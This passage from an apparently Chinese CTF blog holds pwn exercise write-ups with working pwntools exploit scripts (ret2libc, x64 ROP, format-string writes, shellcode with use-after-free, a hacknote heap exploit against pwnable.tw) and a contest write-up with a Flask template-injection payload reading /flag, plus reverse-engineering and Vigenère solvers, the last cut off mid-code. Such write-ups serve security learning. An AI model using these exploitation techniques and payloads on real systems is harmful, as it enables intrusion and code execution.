class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>第二种</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113183137009.png" alt="image-20201113183137009"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2libc2"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">gets_plt = elf.plt[<span class="string">"gets"</span>]</span><br><span class="line">bss = <span class="number">0x804a080</span></span><br><span class="line">pop_ebx_ret = <span class="number">0x804843d</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x70</span> + p32(gets_plt) + p32(pop_ebx_ret) + p32(bss) + p32(system_plt) + p32(pop_ebx_ret) + p32(bss)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b"/bin/bash\x00"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="retlibc3"><a href="#retlibc3" class="headerlink" title="retlibc3"></a>retlibc3</h3><p>栈变量的结构</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113202023659.png" alt="image-20201113202023659"></p>
<p>栈的结构</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113202640601.png" alt="image-20201113202640601"></p>
<p>泄露libc</p>
<p>应该是libc不同导致打不通</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">put = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">puts = libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">system = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,str(put))</span><br><span class="line">io.recvuntil(<span class="string">b" : "</span>)</span><br><span class="line">libcbase = int(io.recvuntil(<span class="string">b"\n"</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - puts</span><br><span class="line">payload = flat( cyclic(<span class="number">60</span>), libcbase + system , <span class="number">0xdeadbeef</span> ,next(elf.search(<span class="string">b"sh\x00"</span>)))</span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="pwn2-x64"><a href="#pwn2-x64" class="headerlink" title="pwn2_x64"></a>pwn2_x64</h3><p>栈图</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201116200344612.png" alt="image-20201116200344612"></p>
<h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><ol>
<li>通过libc泄露系统函数，首先获得基地址可以通过以下来泄露（1）通过ROP系统调用（2）直接函数write泄露</li>
<li>无sh （1）符号有无sh  （2）通过ROP将/bin/sh写入 （3）libc中/bin/sh</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./level3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level3"</span>)</span><br><span class="line">vulfun_addr = <span class="number">0x0804844B</span>  </span><br><span class="line">write_plt = elf.symbols[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">payload1 = cyclic(<span class="number">0x88</span>+<span class="number">4</span>) + p32(write_plt) + p32(vulfun_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b"Input:\n"</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>)) <span class="comment">#Specify four bytes</span></span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">"system"</span>] + libc_base</span><br><span class="line">sh_addr = libc_base + next(libc.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line"><span class="comment">#libc_write=libc.symbols['write']</span></span><br><span class="line"><span class="comment">#libc_system=libc.symbols['system']</span></span><br><span class="line"><span class="comment">#libc_sh=next(libc.search(b'/bin/sh'))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#system_addr=write_addr-libc_write+libc_system </span></span><br><span class="line"><span class="comment">#sh_addr=write_addr-libc_write+libc_sh</span></span><br><span class="line">payload2 = cyclic(<span class="number">0x88</span>+<span class="number">4</span>) + p32(system_addr) + <span class="string">b'A'</span>*<span class="number">4</span> + p32(sh_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="pwn3-x64"><a href="#pwn3-x64" class="headerlink" title="pwn3_x64"></a>pwn3_x64</h3><p>两次ROP</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117174620932.png" alt="image-20201117174620932"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117174719721.png" alt="image-20201117174719721"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#context.log_level="debug" </span></span><br><span class="line">elf=ELF(<span class="string">"level3_x64"</span>) </span><br><span class="line">write_plt=elf.symbols[<span class="string">"write"</span>] </span><br><span class="line">write_got=elf.got[<span class="string">"write"</span>] </span><br><span class="line">vul_addr=elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line">p = process(<span class="string">"./level3_x64"</span>)</span><br><span class="line"><span class="comment">#p=remote("47.116.107.8",9883) </span></span><br><span class="line">p.recvuntil(<span class="string">b"Input:\n"</span>) </span><br><span class="line">pop_rdi_addr=<span class="number">0x00000000004006b3</span>   <span class="comment">#0x00000000004006b3 : pop rdi ; ret</span></span><br><span class="line">pop_rsi_r15_addr=<span class="number">0x00000000004006b1</span>      <span class="comment">#0x00000000004006b1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line">payload1 = cyclic(<span class="number">0x80</span>+<span class="number">8</span>) + p64(pop_rdi_addr) + p64(<span class="number">1</span>) + p64(pop_rsi_r15_addr) + p64(write_got) + p64(<span class="string">'deadbeef'</span>) + p64(write_plt) + p64(vul_addr) </span><br><span class="line">p.sendline(payload1) </span><br><span class="line">t=p.recv(<span class="number">8</span>)</span><br><span class="line">write_addr=u64(t[<span class="number">0</span>:<span class="number">8</span>]) </span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>) </span><br><span class="line">offset=write_addr-libc.symbols[<span class="string">"write"</span>] </span><br><span class="line">sys_addr=offset+libc.symbols[<span class="string">"system"</span>] </span><br><span class="line">bin_addr=offset+next(libc.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line">payload2 = cyclic(<span class="number">0x80</span>+<span class="number">8</span>) + p64(pop_rdi_addr) + p64(bin_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><h3 id="fmtstr1"><a href="#fmtstr1" class="headerlink" title="fmtstr1"></a>fmtstr1</h3><p>还是比较简单的</p>
<p>思路：将x的地址放到栈上，对应的获取栈上的地址相对于<code>printf</code>的第几个参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">conn=process(<span class="string">'./fmtstr1'</span>)</span><br><span class="line">e=ELF(<span class="string">'./fmtstr1'</span>)</span><br><span class="line">x_addr=<span class="number">0x0804A02C</span>                                      </span><br><span class="line">payload=p32(x_addr) + <span class="string">b"%11$n"</span></span><br><span class="line">conn.sendline(payload)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="fmstr2"><a href="#fmstr2" class="headerlink" title="fmstr2"></a>fmstr2</h3><p>这题很奇怪 X64  感觉是爆破出来的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%9$s</span><br></pre></td></tr></table></figure>
<h3 id="fmstr-uaf"><a href="#fmstr-uaf" class="headerlink" title="fmstr_uaf"></a>fmstr_uaf</h3><p>RWX打开，说明应该是返回shellcode</p>
<p>也就是栈上写shellcode</p>
<p>此外，还需要利用堆进行UAF</p>
<p>进行shellcode的调用</p>
<p>同时还有fmstr泄露main’rbp的位置</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122165900691.png" alt="image-20201122165900691"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./echo2"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./echo2"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"hey, what's your name? : "</span>)</span><br><span class="line">shellcode=<span class="string">b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">b"&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">b"2"</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b"%10$p"</span>+<span class="string">b"A"</span>*<span class="number">3</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b"0x"</span>)</span><br><span class="line">shellcode_addr=int(p.recvuntil(<span class="string">b'AAA'</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)<span class="number">-0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b"&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">b"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">b"to exit? (y/n)"</span>)</span><br><span class="line">p.sendline(<span class="string">b"n"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b"&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">b"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">b"hello \n"</span>)</span><br><span class="line">p.sendline(<span class="string">b"A"</span>*<span class="number">24</span>+p64(shellcode_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="堆-1"><a href="#堆-1" class="headerlink" title="堆"></a>堆</h2><h3 id="heap1"><a href="#heap1" class="headerlink" title="heap1"></a>heap1</h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122225712975.png" alt="image-20201122225712975"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122225952773.png" alt="image-20201122225952773"></p>
<p>首先需要搞两个chunk(8byte)，free后，这样，我们fastbin中就会有两个8byte的chunk</p>
<p>之后我们在分配1个chunk，由于fastbin的缘故</p>
<p>我们就会把ptr[1]中的chunk直接拿过来</p>
<p>并且我们可以控制content size为8 我们也就把ptr[0]中的chunk拿了过来</p>
<p>从而达到了UAF</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122231126664.png" alt="image-20201122231126664"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122231528599.png" alt="image-20201122231528599"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(*ptr[v1])(ptr[v1]);</span><br><span class="line">int self_puts(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  return puts(*(a1 + 4));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10102</span>)</span><br><span class="line"><span class="comment">#p=process("./hacknote")</span></span><br><span class="line">elf = ELF(<span class="string">"./hacknote"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">read_got = elf.got[<span class="string">"read"</span>]</span><br><span class="line">pfputs = <span class="number">0x804862b</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(size,index)</span>:</span></span><br><span class="line">      p.recvuntil(<span class="string">b"choice :"</span>)</span><br><span class="line">      p.sendline(<span class="string">b"1"</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b"size :"</span>)</span><br><span class="line">      p.sendline(size)</span><br><span class="line">      p.recvuntil(<span class="string">b"Content :"</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span><span class="params">(index)</span>:</span></span><br><span class="line">      p.recvuntil(<span class="string">b"choice :"</span>)</span><br><span class="line">      p.sendline(<span class="string">b"2"</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b"Index :"</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_note</span><span class="params">(index)</span>:</span></span><br><span class="line">      p.recvuntil(<span class="string">b"choice :"</span>)</span><br><span class="line">      p.sendline(<span class="string">b"3"</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b"Index :"</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">add_note(<span class="string">b"16"</span>,<span class="string">b"aaaaa"</span>)</span><br><span class="line">add_note(<span class="string">b"16"</span>,<span class="string">b"aaaaa"</span>)</span><br><span class="line">delete_note(<span class="string">b'0'</span>)</span><br><span class="line">delete_note(<span class="string">b'1'</span>)</span><br><span class="line">add_note(<span class="string">b'8'</span>,p32(pfputs)+p32(read_got))</span><br><span class="line">print_note(<span class="string">b'0'</span>)</span><br><span class="line"></span><br><span class="line">pfread = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">pfsys = pfread - <span class="number">0xd41c0</span> + <span class="number">0x3a940</span></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">delete_note(<span class="string">b'2'</span>)</span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">add_note(<span class="string">b'8'</span>,p32(pfsys)+<span class="string">b"||sh"</span>)</span><br><span class="line">print_note(<span class="string">b'0'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>​       </p>

        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2020/10/24/CUMT2020%E5%8D%8E%E4%B8%BA%E6%9D%AF/">CUMT2020华为杯</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2020-10-24
        </span><span class="post-category">
            <a href="/categories/CTF/">CTF</a>
            </span>
        <span class="post-visits"
             data-url="/2020/10/24/CUMT2020%E5%8D%8E%E4%B8%BA%E6%9D%AF/"
             data-title="CUMT2020华为杯">
          Visits 0
        </span>
        </div>
    </header>

    <div class="post-content"><a id="more"></a>
<h1 id="CUMT华为杯"><a href="#CUMT华为杯" class="headerlink" title="CUMT华为杯"></a>CUMT华为杯</h1><p>web狗活成了各方向签到手…</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h2><p>模板注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;name&#x3D;&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(40)(%27&#x2F;flag%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="doge"><a href="#doge" class="headerlink" title="doge"></a>doge</h2><p>f12摇奖得flag</p>
<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="hello-world"><a href="#hello-world" class="headerlink" title="hello_world"></a>hello_world</h2><p>异或</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">d=[]</span><br><span class="line">b = <span class="string">"is_easy_right?"</span></span><br><span class="line">a = [<span class="string">'2A'</span>, <span class="string">'26'</span>, <span class="string">'12'</span>, <span class="string">'31'</span>, <span class="string">'1A'</span>, <span class="string">'7'</span>, <span class="string">'11'</span>, <span class="string">'3A'</span>, <span class="string">'2D'</span>, <span class="string">'0F'</span>, <span class="string">'0E'</span>,<span class="string">'1A'</span>, <span class="string">'41'</span>, <span class="string">'4B'</span>, <span class="string">'36'</span>, <span class="string">'43'</span>, <span class="string">'31'</span>, <span class="string">'0'</span>, <span class="string">'3E'</span>, <span class="string">'16'</span>, <span class="string">'17'</span>, <span class="string">'35'</span>,<span class="string">'1D'</span>, <span class="string">'10'</span>, <span class="string">'38'</span>, <span class="string">'11'</span>, <span class="string">'44'</span>, <span class="string">'4A'</span>, <span class="string">'1B'</span>, <span class="string">'2C'</span>, <span class="string">'2B'</span>, <span class="string">'17'</span>,<span class="string">'50'</span>,<span class="string">'3'</span>, <span class="string">'4'</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> a:</span><br><span class="line">    c = <span class="string">''</span></span><br><span class="line">    z = x</span><br><span class="line">    c += <span class="string">'0x'</span></span><br><span class="line">    c +=z</span><br><span class="line">    d.append(c)</span><br><span class="line">d = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">35</span>):</span><br><span class="line">    c = int(a[i],<span class="number">16</span>)</span><br><span class="line">    m = i%<span class="number">14</span></span><br><span class="line">    print(chr(ord((b[m]))^c),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
<h2 id="non-name"><a href="#non-name" class="headerlink" title="non_name"></a>non_name</h2><p>四元一次方程</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">b = [<span class="number">12</span>, <span class="number">32</span>, <span class="number">34</span>, <span class="number">12</span>, <span class="number">53</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">34</span>, <span class="number">45</span>, <span class="number">56</span>, <span class="number">32</span>, <span class="number">85</span>, <span class="number">43</span>]</span><br><span class="line">c = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">    sum1 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">        print(<span class="string">"%s*%s"</span>%(b[i*<span class="number">4</span>+j],c[j]),end=<span class="string">'+'</span>)</span><br><span class="line">    print(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#116 103 102 114</span></span><br></pre></td></tr></table></figure>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="Classical"><a href="#Classical" class="headerlink" title="Classical"></a>Classical</h2><p>维吉尼亚密码，上网down脚本，猜密钥，跑出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">"Elxyi lrw fqfjyxl pr wixx yajy chb qtsk lqfjzrx zs xuua vafe chb nfsl pcgy es ipgv tzxo ywzq rvyc djxcfx lrw oyr tzxo ytc vxhp! Orwto pmlx rvy hafm vh icitt;kz wzxtx dzy phre tg zq;uj hlta czu otpm yz fx,iinamlg rtf ltci zndr qgj wmyl eyd ggg vmlrvl xz dg tne ysi momygk rqn blrm as oo.Eta rtf ltci pngnia mltiprpsk mq ffvi rvy dwwxv,xszyzo xciseu mt xedl czu kmthsr,igvyrh khtkth xh ripp qhw azxeg,lrzuya jhup xh teve qhw afatr? Hphaql rny jsnywplx bp hysikz’wsowl.Ky dzy yliw tztv by sykaw jom,bv iwzftipj hmkvl ysi halpr hxtlty, xhv.Xse ztrinpwm vj aeginx izr’m uineklcknwc ahzp tzx dxxe sy lzprqmjbsr;xalc uukm otpp xal qzsl hh xapvraltny mjty nsflw llggi mmpmk dej.Hsirbspwl smps xht mmzwx dlz cjr,vatdi pos sujm, vatdi pos sanx uxfcgalh,lnv mjhxp aav llvw mtbjo,jhy sylq mjxd neg htarwvktyp xal mxpgkvtsni hm tpoheg.pmz ltci eomvjxi elxpv winxu.Etgi ulktnk pkmm l wfppp,gjhyl btxa h otsk tpw jyhl dmeh s mgtw.Elx ivtgzmgly qymbvp waen tqherz fp bslgw ty e yvvrolmgg ulwm, fsf csg’v zt zr plpw if ekyjfrmpp jom egm lz sy fsfr htum klmebvps sgf ajlvmhgsek.Tpw ny xal iyd, A to zqlh mv xpld rqn ysi VBQECLY kl JynhfXseNbixspvxJmahwk.Dr ysi phc, ceexoujc xh bwp bjtexx miyvvp smuobyemgn."</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(message, key)</span>:</span></span><br><span class="line">    cipher = <span class="string">''</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(message)):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> key[j % len(key)].islower():</span><br><span class="line">            offset = ord(key[j % len(key)]) - ord(<span class="string">'a'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> key[j % len(key)].isupper():</span><br><span class="line">                offset = ord(key[j % len(key)]) - ord(<span class="string">'A'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                offset = ord(key[j % len(key)]) - <span class="number">48</span></span><br><span class="line"></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> message[i].isalpha():</span><br><span class="line">            <span class="keyword">if</span> message[i].islower():</span><br><span class="line">                cipher += chr((ord(message[i]) - ord(<span class="string">'a'</span>) + offset) % <span class="number">26</span> + ord(<span class="string">'a'</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cipher += chr((ord(message[i]) - ord(<span class="string">'A'</span>) + offset) % <span class="number">26</span> + ord(<span class="string">'A'</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cipher += message[i]</span><br><span class="line">            j -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cipher, key)</span>:</span></span><br><span class="line">    explain = <span class="string">''</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> key[j % len(key)].islower():</span><br><span class="line">            offset = ord(key[j % len(key)]) - ord(<span class="string">'a'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> key[j % len(key)].isupper():</span><br><span class="line">                offset = ord(key[j % len(key)]) - ord(<span class="string">'A'</span>)</span><br><span class="line">            <span 